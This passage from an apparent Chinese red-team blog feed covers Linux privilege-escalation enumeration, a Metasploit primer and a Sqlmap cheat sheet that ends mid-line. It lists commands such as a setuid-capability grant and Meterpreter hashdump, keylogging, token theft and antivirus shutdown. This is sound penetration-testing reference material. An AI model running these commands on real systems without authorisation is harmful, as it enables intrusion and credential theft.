<h3 id="2-可用文件查找"><a href="#2-可用文件查找" class="headerlink" title="2. 可用文件查找"></a>2. 可用文件查找</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getcap -r /usr/bin</span><br><span class="line"></span><br><span class="line">setcap cap_net_raw+p /bin/*</span><br><span class="line"></span><br><span class="line">setcap cap_setuid+ep /usr/bin/*</span><br><span class="line"></span><br><span class="line">grep -v &#x27;^#\|none\|^$&#x27; /etc/security/capability.conf 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><strong>可写权限文件查找</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -writable ! -user `whoami` -type f ! -path &quot;/proc/*&quot; ! -path &quot;/sys/*&quot; -exec ls -al &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line">find / -perm -2 -type f 2&gt;/dev/null</span><br><span class="line">find / ! -path &quot;*/proc/*&quot; -perm -2 -type f -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<h2 id="0xFF-参考资源"><a href="#0xFF-参考资源" class="headerlink" title="0xFF 参考资源"></a>0xFF 参考资源</h2><p><strong>GTFOBins</strong></p>
<ul>
<li><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></li>
</ul>
<p><strong>提权漏洞</strong></p>
<ul>
<li><a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs</a></li>
<li><a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a></li>
<li><a href="https://github.com/xairy/kernel-exploits">https://github.com/xairy/kernel-exploits</a></li>
</ul>
<p><strong>提权脚本</strong></p>
<ul>
<li><a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></li>
<li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a></li>
<li><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></li>
<li><a href="https://github.com/redcode-labs/Bashark">https://github.com/redcode-labs/Bashark</a></li>
<li><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></li>
<li><a href="https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</a></li>
<li><a href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings</a></li>
</ul>
]]></content>
      <categories>
        <category>红队渗透</category>
      </categories>
      <tags>
        <tag>Privilege Escalation</tag>
      </tags>
  </entry>
  <entry>
    <title>Metsploit基础篇</title>
    <url>/posts/16803/</url>
    <content><![CDATA[<center>Metsploit基本方法、实用技巧总结...</center>

<span id="more"></span>
<hr>
<h2 id="0x01-基本介绍"><a href="#0x01-基本介绍" class="headerlink" title="0x01 基本介绍"></a>0x01 基本介绍</h2><h3 id="1-架构图"><a href="#1-架构图" class="headerlink" title="1. 架构图"></a>1. 架构图</h3><p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/msfarch2.png"></p>
<h3 id="2-目录结构"><a href="#2-目录结构" class="headerlink" title="2. 目录结构"></a>2. 目录结构</h3><p><strong>源码结构</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">├── bin</span><br><span class="line">│   ├── msfbinscan</span><br><span class="line">│   ├── msfconsole</span><br><span class="line">│   ├── msfd</span><br><span class="line">│   ├── msfdb</span><br><span class="line">│   ├── msfelfscan</span><br><span class="line">│   ├── msfmachscan</span><br><span class="line">│   ├── msfpescan</span><br><span class="line">│   ├── msfremove</span><br><span class="line">│   ├── msfrop</span><br><span class="line">│   ├── msfrpc</span><br><span class="line">│   ├── msfrpcd</span><br><span class="line">│   ├── msfupdate</span><br><span class="line">│   └── msfvenom</span><br><span class="line">├── embedded</span><br><span class="line">│   ├── bin</span><br><span class="line">│   ├── framework</span><br><span class="line">│   ├── include</span><br><span class="line">│   ├── lib</span><br><span class="line">│   ├── share</span><br><span class="line">│   └── ssl</span><br><span class="line">├── LICENSE</span><br><span class="line">├── LICENSES</span><br><span class="line">├── version-manifest.json</span><br><span class="line">└── version-manifest.txt  </span><br></pre></td></tr></table></figure>

<p><strong>Metasploit框架</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）framework目录</span><br><span class="line"></span><br><span class="line">$ tree -L 1 /opt/metasploit-framework/embedded/framework</span><br><span class="line">.</span><br><span class="line">|-- config      //metasploit的环境配置信息，数据库配置信息</span><br><span class="line">|-- data        //存放meterpreter，exploits，wordlists等数据信息</span><br><span class="line">|-- external    //metasploit的一些基础扩展模块</span><br><span class="line">|-- lib         //metasploit的一些基础类和第三方模块类</span><br><span class="line">|-- modules     //metasploit模块</span><br><span class="line">|-- msfconsole  //metasploit的基本命令行</span><br><span class="line">|-- msfd        //metasploit服务</span><br><span class="line">|-- msfrpc      //metasploit的服务端</span><br><span class="line">|-- msfrpcd     //持久性的metasploit本地服务，可以给远程用户提供rpc服务以及其他的http服务</span><br><span class="line">|-- msfupdate   //metasploit更新模块</span><br><span class="line">|-- msfvenom    //集成了msfpayload和msfencode的功能，效率更高</span><br><span class="line">|-- plugins     //metasploit的第三方插件接口</span><br><span class="line">|-- scripts     //存放一些msf用到的脚本，如meterpreter，ps，resource，shell</span><br><span class="line">|-- tools       //第三方脚本工具</span><br><span class="line"></span><br><span class="line">2）Metasploit模块</span><br><span class="line"></span><br><span class="line">$ tree -L 2 /opt/metasploit-framework/embedded/framework/modules</span><br><span class="line">.</span><br><span class="line">|-- auxiliary    //辅助模块:包含端口扫描器、嗅探器、fuzzers、暴力破解等</span><br><span class="line">|-- encoders     //编码器模块:对payload进行编码加密，绕过杀软</span><br><span class="line">|-- evasion      //检测规避模块</span><br><span class="line">|-- exploits     //漏洞利用模块:对某些可能存在漏洞的目标进行漏洞利用</span><br><span class="line">|-- nops         //空指令模块:不影响进程运行的空命令或无关命令，用于填充</span><br><span class="line">|-- payloads     //攻击载荷:攻击成功后在目标机执行的代码，如反弹shell、bind shell等</span><br><span class="line">`-- post         //后渗透模块:用于内网渗透</span><br></pre></td></tr></table></figure>

<h2 id="0x02-常用命令"><a href="#0x02-常用命令" class="headerlink" title="0x02 常用命令"></a>0x02 常用命令</h2><h3 id="1-基础命令"><a href="#1-基础命令" class="headerlink" title="1. 基础命令"></a>1. 基础命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show exploits – 查看所有可用的渗透攻击程序代码 </span><br><span class="line">show auxiliary – 查看所有可用的辅助攻击工具 </span><br><span class="line">show options – 查看该模块所有可用选项 </span><br><span class="line">show payloads – 查看该模块适用的所有载荷代码 </span><br><span class="line">show targets – 查看该模块适用的攻击目标类型</span><br><span class="line">search – 根据关键字搜索某模块 </span><br><span class="line">info – 显示某模块的详细信息</span><br><span class="line">exploit - 漏洞利用 </span><br><span class="line">use – 进入使用某渗透攻击模块 </span><br><span class="line">back – 回退 </span><br><span class="line">check - 检查目标是否可漏洞利用</span><br><span class="line">grep - 匹配指定内容</span><br><span class="line">set/unset – 设置/禁用模块中的某个参数 </span><br><span class="line">setg/unsetg – 设置/禁用适用于所有模块的全局参数 </span><br><span class="line">save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用</span><br></pre></td></tr></table></figure>

<p><strong>命令示例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf &gt; grep http search mysql</span><br><span class="line"></span><br><span class="line">msf &gt; search name:mysql  //根据名称搜索</span><br><span class="line"></span><br><span class="line">msf &gt; search platform:linux  //搜索指定平台模块</span><br><span class="line"></span><br><span class="line">msf &gt; search type:post  //根据auxiliary, post, exploit等模块类型进行搜索</span><br><span class="line"></span><br><span class="line">msf &gt; search cve:2019 type:exploit platform:linux  //组合搜索</span><br><span class="line"></span><br><span class="line">msf exploit(3proxy) &gt; sessions -l    //列出活动的会话</span><br><span class="line"></span><br><span class="line">msf exploit(3proxy) &gt; sessions -i 1   //指定会话ID进行交互</span><br><span class="line"></span><br><span class="line">msf exploit(3proxy) &gt; sessions -s checkvm -i 2-4  //在指定会话上执行脚本</span><br></pre></td></tr></table></figure>

<h3 id="2-Meterpreter命令"><a href="#2-Meterpreter命令" class="headerlink" title="2. Meterpreter命令"></a>2. Meterpreter命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; background  放回后台</span><br><span class="line">meterpreter &gt; exit  关闭会话</span><br><span class="line">meterpreter &gt; help  帮助信息</span><br><span class="line">meterpreter &gt; Sysinfo系统平台信息</span><br><span class="line">meterpreter &gt; screenshot  屏幕截取</span><br><span class="line">meterpreter &gt; shell  命令行shell (exit退出)</span><br><span class="line">meterpreter &gt; getlwd  查看本地目录</span><br><span class="line">meterpreter &gt; lcd  切换本地目录</span><br><span class="line">meterpreter &gt; getwd  查看目录</span><br><span class="line">meterpreter &gt; ls 查看文件目录列表</span><br><span class="line">meterpreter &gt; cd  切换目录 </span><br><span class="line">meterpreter &gt; rm  删除文件 </span><br><span class="line">meterpreter &gt; download /data/1.txt 1.txt 下载文件</span><br><span class="line">meterpreter &gt; upload /var/www/wce.exe wce.exe  上传文件</span><br><span class="line">meterpreter &gt; search -d c:  -f *.doc  搜索文件</span><br><span class="line">meterpreter &gt; execute -f  cmd.exe -i   执行程序/命令 </span><br><span class="line">meterpreter &gt; ps  查看进程</span><br><span class="line">meterpreter &gt; run post/windows/capture/keylog_recorder   键盘记录</span><br><span class="line">meterpreter &gt; getuid  查看当前用户权限</span><br><span class="line">meterpreter &gt; use priv  加载特权模块</span><br><span class="line">meterpreter &gt; getsystem  提升到SYSTEM权限</span><br><span class="line">meterpreter &gt; hashdump  导出密码散列</span><br><span class="line">meterpreter &gt; ps   查看高权限用户PID</span><br><span class="line">meterpreter &gt; steal_token &lt;PID&gt;  窃取令牌</span><br><span class="line">meterpreter &gt; rev2self  恢复原来的令牌 </span><br><span class="line">meterpreter &gt; migrate pid  迁移进程</span><br><span class="line">meterpreter &gt; run killav  关闭杀毒软件 </span><br><span class="line">meterpreter &gt; run getgui-e  启用远程桌面</span><br><span class="line">meterpreter &gt; portfwd add -l 1234 -p 3389 -r &lt;目标IP&gt;  端口转发</span><br><span class="line">meterpreter &gt; run get_local_subnets  获取内网网段信息</span><br><span class="line">meterpreter &gt; run autoroute -s &lt;内网网段&gt;  创建自动路由</span><br><span class="line">meterpreter &gt; run autoroute -p  查看自动路由表</span><br><span class="line">创建代理通道:</span><br><span class="line">msf &gt; use auxiliary/server/socks4a   设置socks4代理模块</span><br><span class="line">msf auxiliary(socks4a) &gt; show options </span><br><span class="line">msf auxiliary(socks4a) &gt; run</span><br></pre></td></tr></table></figure>

<h2 id="0xFF-参考资源"><a href="#0xFF-参考资源" class="headerlink" title="0xFF 参考资源"></a>0xFF 参考资源</h2><ul>
<li><p><a href="https://metasploit.help.rapid7.com/docs">https://metasploit.help.rapid7.com/docs</a></p>
</li>
<li><p><a href="https://github.com/rapid7/metasploit-framework/wiki">https://github.com/rapid7/metasploit-framework/wiki</a></p>
</li>
<li><p><a href="https://www.offensive-security.com/metasploit-unleashed/introduction/">https://www.offensive-security.com/metasploit-unleashed/introduction/</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>红队渗透</category>
      </categories>
      <tags>
        <tag>Metsploit</tag>
        <tag>Tookit</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqlmap备忘单</title>
    <url>/posts/30803/</url>
    <content><![CDATA[<center>Sqlmap常用参数及用法备忘单...</center>

<span id="more"></span>
<hr>
<h2 id="0x01-选项"><a href="#0x01-选项" class="headerlink" title="0x01 选项"></a>0x01 选项</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Usage: python sqlmap.py [options]</span><br><span class="line"></span><br><span class="line">Options（选项）:</span><br><span class="line"></span><br><span class="line">-h,         ## 展示帮助文档参数</span><br><span class="line"></span><br><span class="line">-hh         ## 展示详细帮助文档参数</span><br><span class="line"></span><br><span class="line">--version   ## 显示程序的版本号</span><br><span class="line"></span><br><span class="line">-v          ## 详细级别：0-6（默认为1）</span><br></pre></td></tr></table></figure>

<h2 id="0x02-目标"><a href="#0x02-目标" class="headerlink" title="0x02 目标"></a>0x02 目标</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Target（目标）:</span><br><span class="line"></span><br><span class="line">-d      ## 指定具体数据库</span><br><span class="line"></span><br><span class="line">-u URL  ## 目标URL (e.g. &quot;http://www.example.com/test.php?id=1&quot;)</span><br><span class="line"></span><br><span class="line">-l      ## 解析目标(s)从Burp或WebScarab代理日志文件</span><br><span class="line"></span><br><span class="line">-x      ## 从远程站点地图文件(.xml)解析目标</span><br><span class="line"></span><br><span class="line">-m      ## 扫描文本文件中给出的多个目标</span><br><span class="line"></span><br><span class="line">-r      ## 从本地文件加载HTTP请求 ，多用于post注入</span><br><span class="line"></span><br><span class="line">-g      ## 处理Google的结果作为目标URL</span><br><span class="line"></span><br><span class="line">-c      ## 从INI配置文件中加载选项</span><br></pre></td></tr></table></figure>

<h2 id="0x03-请求"><a href="#0x03-请求" class="headerlink" title="0x03 请求"></a>0x03 请求</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Request（请求）: 这些选项可以用来指定如何连接到目标URL</span><br><span class="line"></span><br><span class="line">--method=METHOD  ## 强制使用给定的HTTP方法（e.g. POST）</span><br><span class="line"></span><br><span class="line">--data=DATA ## 通过POST发送的数据字符串</span><br><span class="line"></span><br><span class="line">--param-del=PARA..  ## 用于拆分参数值的字符</span><br><span class="line"></span><br><span class="line">--cookie=COOKIE ## Cookie头的值</span><br><span class="line"></span><br><span class="line">--cookie-del=COO.. ## 用于分割Cookie值的字符</span><br><span class="line"></span><br><span class="line">--load-cookies=L.. ## 包含Netscape/wget格式的cookie的文件</span><br><span class="line"></span><br><span class="line">--drop-set-cookie ## 从响应中忽略Set-Cookie头</span><br><span class="line"></span><br><span class="line">--user-agent=AGENT ## 指定 HTTP User - Agent头</span><br><span class="line"></span><br><span class="line">--random-agent ##  使用随机选定的HTTP User - Agent头</span><br><span class="line"></span><br><span class="line">--host=HOST ## HTTP主机头值</span><br><span class="line"></span><br><span class="line">--referer=REFERER ##  指定 HTTP Referer头</span><br><span class="line"></span><br><span class="line">-H HEADER, --hea.. ## 额外header (e.g. &quot;X-Forwarded-For: 127.0.0.1&quot;)</span><br><span class="line"></span><br><span class="line">--headers=HEADERS ## 额外header (e.g. &quot;Accept-Language: fr\\nETag: 123&quot;)</span><br><span class="line"></span><br><span class="line">--auth-type=AUTH.. ## 认证类型(Basic, Digest, NTLM or PKI)</span><br><span class="line"></span><br><span class="line">--auth-cred=AUTH.. ##  HTTP认证凭证(name:password)</span><br><span class="line"></span><br><span class="line">--auth-file=AUTH.. ## HTTP认证 PEM认证/私钥文件</span><br><span class="line"></span><br><span class="line">--ignore-401 ## 忽略HTTP错误401</span><br><span class="line"></span><br><span class="line">--proxy=PROXY ## 使用代理连接到目标网址</span><br><span class="line"></span><br><span class="line">--proxy-cred=PRO.. ## 代理认证证书(name:password)</span><br><span class="line"></span><br><span class="line">--proxy-file=PRO.. ## 从文件中加载代理列表</span><br><span class="line"></span><br><span class="line">--ignore-proxy ## 忽略系统默认代理设置</span><br><span class="line"></span><br><span class="line">--tor ## 使用Tor匿名网络</span><br><span class="line"></span><br><span class="line">--tor-port=TORPORT ##  设置Tor代理端口而不是默认值</span><br><span class="line"></span><br><span class="line">--tor-type=TORTYPE ## 设置Tor代理类型</span><br><span class="line"></span><br><span class="line">--check-tor ## 检查Tor是否正确使用</span><br><span class="line"></span><br><span class="line">--delay=DELAY ## 每个HTTP请求之间的延迟（秒）</span><br><span class="line"></span><br><span class="line">--timeout=TIMEOUT ## 秒超时连接前等待（默认30）</span><br><span class="line"></span><br><span class="line">--retries=RETRIES ##  连接超时时重试（默认值3）</span><br><span class="line"></span><br><span class="line">--randomize=RPARAM ## 随机更改给定参数的值(s)</span><br><span class="line"></span><br><span class="line">--safe-url=SAFEURL ## 在测试期间频繁访问的URL地址</span><br><span class="line"></span><br><span class="line">--safe-post=SAFE.. ## POST数据发送到安全URL</span><br><span class="line"></span><br><span class="line">--safe-req=SAFER.. ## 从文件加载安全HTTP请求</span><br><span class="line"></span><br><span class="line">--safe-freq=SAFE.. ## 在两次访问给定安全网址之间测试请求</span><br><span class="line"></span><br><span class="line">--skip-urlencode ## 跳过有效载荷数据的URL编码</span><br><span class="line"></span><br><span class="line">--csrf-token=CSR.. ## 参数用于保存anti-CSRF令牌</span><br><span class="line"></span><br><span class="line">--csrf-url=CSRFURL ## 提取anti-CSRF URL地址访问令牌</span><br><span class="line"></span><br><span class="line">--force-ssl ## 强制使用SSL /HTTPS</span><br><span class="line"></span><br><span class="line">--hpp ## 使用HTTP参数pollution的方法</span><br><span class="line"></span><br><span class="line">--eval=EVALCODE ## 评估请求之前提供Python代码(如&quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="0x04-性能优化"><a href="#0x04-性能优化" class="headerlink" title="0x04 性能优化"></a>0x04 性能优化</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Optimization（优化）: 这些选项可用于优化sqlmap的性能</span><br><span class="line"></span><br><span class="line">-o ## 开启所有优化开关</span><br><span class="line"></span><br><span class="line">--predict-output ## 预测常见的查询输出</span><br><span class="line"></span><br><span class="line">--keep-alive ## 使用持久的HTTP（S）连接</span><br><span class="line"></span><br><span class="line">--null-connection ## 从没有实际的HTTP响应体中检索页面长度</span><br><span class="line"></span><br><span class="line">--threads=THREADS ## 最大的HTTP（S）请求并发量（默认为1）</span><br></pre></td></tr></table></figure>

<h2 id="0x05-注入"><a href="#0x05-注入" class="headerlink" title="0x05 注入"></a>0x05 注入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Injection（注入）: 用来指定测试哪些参数，提供自定义的注入payloads和可选篡改脚本</span><br><span class="line"></span><br><span class="line">-p ## 可测试的参数（S）</span><br><span class="line"></span><br><span class="line">--skip=SKIP ## 跳过对给定参数的测试</span><br><span class="line"></span><br><span class="line">--skip-static ## 跳过测试不显示为动态的参数</span><br><span class="line"></span><br><span class="line">--param-exclude=.. ## 使用正则表达式排除参数进行测试（e.g. &quot;ses&quot;）</span><br><span class="line"></span><br><span class="line">--dbms=DBMS ## 强制后端的DBMS为此值</span><br><span class="line"></span><br><span class="line">--dbms-cred=DBMS.. ## DBMS认证凭证(user:password)</span><br><span class="line"></span><br><span class="line">--os=OS ## 强制后端的DBMS操作系统为这个值</span><br><span class="line"></span><br><span class="line">--invalid-bignum ## 使用大数字使值无效</span><br><span class="line"></span><br><span class="line">--invalid-logical ## 使用逻辑操作使值无效</span><br><span class="line"></span><br><span class="line">--invalid-string ## 使用随机字符串使值无效</span><br><span class="line"></span><br><span class="line">--no-cast ## 关闭有效载荷铸造机制</span><br><span class="line"></span><br><span class="line">--no-escape ## 关闭字符串转义机制</span><br><span class="line"></span><br><span class="line">--prefix=PREFIX ## 注入payload字符串前缀</span><br><span class="line"></span><br><span class="line">--suffix=SUFFIX ## 注入payload字符串后缀</span><br><span class="line"></span><br><span class="line">--tamper=TAMPER ## 使用给定的脚本（S）篡改注入数据</span><br></pre></td></tr></table></figure>

<h2 id="0x06-检测"><a href="#0x06-检测" class="headerlink" title="0x06 检测"></a>0x06 检测</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Detection（检测）: 用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容</span><br><span class="line"></span><br><span class="line">--level=LEVEL ## 执行测试的等级（1-5，默认为1）</span><br><span class="line"></span><br><span class="line">--risk=RISK ## 执行测试的风险（0-3，默认为1）</span><br><span class="line"></span><br><span class="line">--string=STRING ## 查询时有效时在页面匹配字符串</span><br><span class="line"></span><br><span class="line">--not-string=NOT.. ## 当查询求值为无效时匹配的字符串</span><br><span class="line"></span><br><span class="line">--regexp=REGEXP ## 查询时有效时在页面匹配正则表达式</span><br><span class="line"></span><br><span class="line">--code=CODE ## 当查询求值为True时匹配的HTTP代码</span><br><span class="line"></span><br><span class="line">--text-only ## 仅基于在文本内容比较网页</span><br><span class="line"></span><br><span class="line">--titles ##  仅根据他们的标题进行比较</span><br></pre></td></tr></table></figure>

<h2 id="0x07-技巧"><a href="#0x07-技巧" class="headerlink" title="0x07 技巧"></a>0x07 技巧</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Techniques（技巧）: 用于调整具体的SQL注入测试。</span><br><span class="line"></span><br><span class="line">--technique=TECH ## SQL 注入技术测试（默认BEUST）</span><br><span class="line"></span><br><span class="line">--time-sec=TIMESEC ##  DBMS响应的延迟时间（默认为5秒）</span><br><span class="line"></span><br><span class="line">--union-cols=UCOLS ##  定列范围用于测试UNION查询注入</span><br><span class="line"></span><br><span class="line">--union-char=UCHAR ##  用于暴力猜解列数的字符</span><br><span class="line"></span><br><span class="line">--union-from=UFROM ##  要在UNION查询SQL注入的FROM部分使用的表</span><br><span class="line"></span><br><span class="line">--dns-domain=DNS.. ##  域名用于DNS漏出攻击</span><br><span class="line"></span><br><span class="line">--second-order=S.. ## 生成页面的URL搜索为second-order响应</span><br></pre></td></tr></table></figure>

<h2 id="0x08-指纹"><a href="#0x08-指纹" class="headerlink" title="0x08 指纹"></a>0x08 指纹</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Fingerprint（指纹）</span><br><span class="line"></span><br><span class="line">-f  ## 执行检查广泛的DBMS版本指纹</span><br></pre></td></tr></table></figure>

<h2 id="0x09-枚举"><a href="#0x09-枚举" class="headerlink" title="0x09 枚举"></a>0x09 枚举</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Enumeration（枚举）: 用来列举后端数据库管理系统的信息、表中的结构和数据，还可以运行自己的SQL语句</span><br><span class="line"></span><br><span class="line">-a, ## 检索一切</span><br><span class="line"></span><br><span class="line">-b, ## 检索数据库管理系统的标识</span><br><span class="line"></span><br><span class="line">--current-user ## 检索数据库管理系统的标识</span><br><span class="line"></span><br><span class="line">--current-db ## 检索数据库管理系统当前数据库</span><br><span class="line"></span><br><span class="line">-hostname ## 检索数据库服务器的主机名</span><br><span class="line"></span><br><span class="line">--is-dba ## 检测DBMS当前用户是否DBA</span><br><span class="line"></span><br><span class="line">--users ## 枚举数据库管理系统用户</span><br><span class="line"></span><br><span class="line">--passwords ## 枚举数据库管理系统用户密码哈希</span><br><span class="line"></span><br><span class="line">--privileges ## 枚举数据库管理系统用户的权限</span><br><span class="line"></span><br><span class="line">--roles ## 枚举数据库管理系统用户的角色</span><br><span class="line"></span><br><span class="line">--dbs ## 枚举数据库管理系统数据库</span><br><span class="line"></span><br><span class="line">--tables ## 枚举的DBMS数据库中的表</span><br><span class="line"></span><br><span class="line">--columns ## 枚举DBMS数据库表列</span><br><span class="line"></span><br><span class="line">--schema ## 枚举数据库架构</span><br><span class="line"></span><br><span class="line">--count ## 检索表的条目数</span><br><span class="line"></span><br><span class="line">--dump ## 转储数据库管理系统的数据库中的表项</span><br><span class="line"></span><br><span class="line">--dump-all ## 转储数据库管理系统的数据库中的表项</span><br><span class="line"></span><br><span class="line">--search ## 搜索列（S），表（S）和/或数据库名称（S）</span><br><span class="line"></span><br><span class="line">--comments ## 检索数据库的comments(注释、评论)</span><br><span class="line"></span><br><span class="line">-D DB ## 要进行枚举的数据库名</span><br><span class="line"></span><br><span class="line">-T TBL ## 要进行枚举的数据库表</span><br><span class="line"></span><br><span class="line">-C COL ## 要进行枚举的数据库列</span><br><span class="line"></span><br><span class="line">-X EXCLUDECOL ## 不进行枚举的数据库列</span><br><span class="line"></span><br><span class="line">-U USER ## 用来进行枚举的数据库用户</span><br><span class="line"></span><br><span class="line">--exclude-sysdbs ## 枚举表时排除系统数据库</span><br><span class="line"></span><br><span class="line">--pivot-column=P.. ## 主列名称</span><br><span class="line"></span><br><span class="line">--where=DUMPWHERE ## 使用WHERE条件进行表转储</span><br><span class="line"></span><br><span class="line">--start=LIMITSTART ## 第一个查询输出进入检索</span><br><span class="line"></span><br><span class="line">--stop=LIMITSTOP ## 最后查询的输出进入检索</span><br><span class="line"></span><br><span class="line">--first=FIRSTCHAR ## 第一个查询输出字的字符检索</span><br><span class="line"></span><br><span class="line">--last=LASTCHAR ## 最后查询的输出字字符检索</span><br><span class="line"></span><br><span class="line">--sql-query=QUERY ## 要执行的SQL语句</span><br><span class="line"></span><br><span class="line">--sql-shell ## 提示交互式SQL的shell</span><br><span class="line"></span><br><span class="line">--sql-file=SQLFILE ## 从给定文件执行SQL语句</span><br></pre></td></tr></table></figure>

<h2 id="0x0A-蛮力检查"><a href="#0x0A-蛮力检查" class="headerlink" title="0x0A 蛮力检查"></a>0x0A 蛮力检查</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Brute force（蛮力）: 可以被用来运行蛮力检查</span><br><span class="line"></span><br><span class="line">--common-tables ## 检查存在共同表</span><br><span class="line"></span><br><span class="line">--common-columns ## 检查存在共同列</span><br></pre></td></tr></table></figure>

<h2 id="0x0B-访问操作"><a href="#0x0B-访问操作" class="headerlink" title="0x0B 访问操作"></a>0x0B 访问操作</h2><p><strong>访问文件系统</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">File system access（访问文件系统）:</span><br><span class="line"> 可以被用来访问后端数据库管理系统的底层文件系统</span><br><span class="line"></span><br><span class="line">--file-read=RFILE ## 从后端的数据库管理系统文件系统读取文件</span><br><span class="line"></span><br><span class="line">--file-write=WFILE ## 编辑后端的数据库管理系统文件系统上的本地文件</span><br><span class="line"></span><br><span class="line">--file-dest=DFILE ## 后端的数据库管理系统写入文件的绝对路径</span><br></pre></td></tr></table></figure>

<p><strong>操作系统访问</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Operating system access（操作系统访问）: 可以用于访问后端数据库管理系统的底层操作系统</span><br><span class="line"></span><br><span class="line">--os-cmd=OSCMD ## 执行操作系统命令</span><br><span class="line"></span><br><span class="line">--os-shell ## 交互式的操作系统的shell</span><br><span class="line"></span><br><span class="line">--os-pwn ## 获取一个OOB shell，meterpreter或VNC</span><br><span class="line"></span><br><span class="line">--os-smbrelay ## 一键获取一个OOB shell，meterpreter或VNC</span><br><span class="line"></span><br><span class="line">--os-bof ## 存储过程缓冲区溢出利用</span><br><span class="line"></span><br><span class="line">--priv-esc Database process user privilege escalation</span><br><span class="line">## 数据库进程用户权限提升</span><br><span class="line"></span><br><span class="line">--msf-path=MSFPATH ## 本地的安装路径</span><br><span class="line"></span><br><span class="line">--tmp-path=TMPPATH ## 远程临时文件目录的绝对路径</span><br></pre></td></tr></table></figure>

<p><strong>Windows注册表访问</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows registry access（Windows注册表访问）: 可以被用来访问后端数据库管理系统Windows注册表。</span><br><span class="line"></span><br><span class="line">--reg-read ## 读一个Windows注册表项值</span><br><span class="line"></span><br><span class="line">--reg-add ## 写一个Windows注册表项值数据</span><br><span class="line"></span><br><span class="line">--reg-del ## 删除Windows注册表键值</span><br><span class="line"></span><br><span class="line">--reg-key=REGKEY ## Windows注册表键</span><br><span class="line"></span><br><span class="line">--reg-value=REGVAL ##  Windows注册表项值</span><br><span class="line"></span><br><span class="line">--reg-data=REGDATA ## Windows注册表键值数据</span><br><span class="line"></span><br><span class="line">--reg-type=REGTYPE ## Windows注册表项值类型</span><br></pre></td></tr></table></figure>

<h2 id="0x0C-常用参数"><a href="#0x0C-常用参数" class="headerlink" title="0x0C 常用参数"></a>0x0C 常用参数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">General : 可以用来设置一些一般的工作参数</span><br><span class="line"></span><br><span class="line">-s SESSIONFILE ## 保存和恢复检索会话文件的所有数据</span><br><span class="line"></span><br><span class="line">-t TRAFFICFILE ## 记录所有HTTP流量到一个文本文件中</span><br><span class="line"></span><br><span class="line">--batch ## 从不询问用户输入，使用所有默认配置</span><br><span class="line"></span><br><span class="line">--binary-fields=.. ## 具有二进制值的结果字段</span><br><span class="line"></span><br><span class="line">--charset=CHARSET ## 强制用于数据检索的字符编码</span><br><span class="line"></span><br><span class="line">--crawl=CRAWLDEPTH ## 从目标网址开始抓取网站</span><br><span class="line"></span><br><span class="line">--crawl-exclude=.. ## 正则表达式排除网页抓取</span><br><span class="line"></span><br><span class="line">--csv-del=CSVDEL ## 分隔CSV输出中使用的字符</span><br><span class="line"></span><br><span class="line">--dump-format=DU.. ## 转储数据的格式 (CSV (default), HTML or SQLITE)</span><br><span class="line"></span><br><span class="line">--eta ## 显示每个输出的预计到达时间</span><br><span class="line"></span><br><span class="line">--flush-session ## 刷新当前目标的会话文件</span><br><span class="line"></span><br><span class="line">--forms ## 在目标网址上解析和测试表单</span><br><span class="line"></span><br><span class="line">--fresh-queries ## 忽略在会话文件中存储的查询结果</span><br><span class="line"></span><br><span class="line">--hex ## 使用DBMS hex函数进行数据检索</span><br><span class="line"></span><br><span class="line">--output-dir=OUT.. ## 自定义输出目录路径</span><br><span class="line"></span><br><span class="line">--parse-errors ## 解析和显示响应中的DBMS错误消息</span><br><span class="line"></span><br><span class="line">--save=SAVECONFIG ## 保存选项到INI配置文件</span><br><span class="line"></span><br><span class="line">--scope=SCOPE ## 